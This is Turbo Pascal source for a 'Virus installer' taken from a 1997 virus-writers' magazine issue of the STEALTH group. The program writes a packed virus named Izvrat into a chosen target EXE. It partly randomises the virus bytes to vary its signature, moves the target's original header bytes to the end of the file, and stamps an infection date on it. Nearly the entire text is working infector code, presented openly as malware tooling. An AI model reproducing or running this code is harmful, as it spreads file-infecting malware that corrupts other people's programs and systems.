{
      ‹‹                  €
     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € ﬂﬂﬂ€ €
       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € ‹‹‹€ €
       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €‹‹‹ €
       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
                              sgww@hotmail.com
            Digest of IV 8 - 11 russian, including Moscow issues


                                Virus installer
}
Uses Dos;

 Const
     VirLen  =  5555;     { Length of packed with PkLite -E virus }

 Var
   DirInfo  :  SearchRec;
   BufFrom  :  Array [1..VirLen] of Char;
   BufTo    :  Array [1..VirLen] of Char;
   FromF    :  File;
   ToF      :  File;
   I        :  Byte;
   Time     :  LongInt;
   DT       :  DateTime;

 begin  { * MAIN * }

  If ParamCount <> 2 Then
    begin
       WriteLn(#13#10'- Required parameters missing');
       WriteLn('Usage: ',ParamStr(0),' Izvrat.EXE Target_Program.EXE'#13#10);
       Halt;
    end;

  FindFirst(ParamStr(1) , AnyFile , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(1) , '" not found!'#13#10);
        Halt;
     end;

 If Dirinfo.Size <> VirLen Then
 begin
  WriteLn(#13#10'Size of "',Paramstr(1),'" & virus size do not match!'#13#10);
  Halt;
 end;

  Assign(FromF , ParamStr(1));
  Reset(FromF , 1);

  FindFirst(ParamStr(2) , Archive , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(2) , '" not found or not Archive');
        WriteLn('Set Archive attribute then try again'#13#10);
        Halt;
     end;

  If Dirinfo.Size < 10240 Then
    begin
       WriteLn(#13#10'Size of "',ParamStr(2),'" must be above 10k'#13#10);
       Halt;
    end;

  Time:=DirInfo.Time;
  UnPackTime(Time , DT);

  Assign(ToF , ParamStr(2));
  Reset(ToF , 1);

  Seek(FromF , 0);
  Seek(ToF , 0);

  BlockRead(FromF , BufFrom , VirLen);
  BlockRead(ToF , BufTo , VirLen);

  Randomize;
  For I:=31 To 82 Do BufFrom[I]:=Chr(Random(255));

  Randomize;
  For I:=147 To 163 Do BufFrom[I]:=Chr(Random(255));

  BufFrom[160]:=Chr(0);

  Seek(ToF , 0);
  BlockWrite(ToF , BufFrom , VirLen);

  Seek(ToF , DirInfo.Size);
  BlockWrite(ToF , BufTo , VirLen);

  Close(FromF);

  Dt.Month:=5;
  Dt.Day:=21;
  PackTime(DT , Time);
  Reset(ToF);
  SetFTime(ToF , Time);

  Close(ToF);

  WriteLn(#13#10'Copyleft (cl) Dirty Nazi 1996. Stealth Group World Wide.');
  WriteLn('"' , ParamStr(2) , '" now infected by Izvrat v3.1beta'#13#10);

 end.  { * #$^@#^&$# * }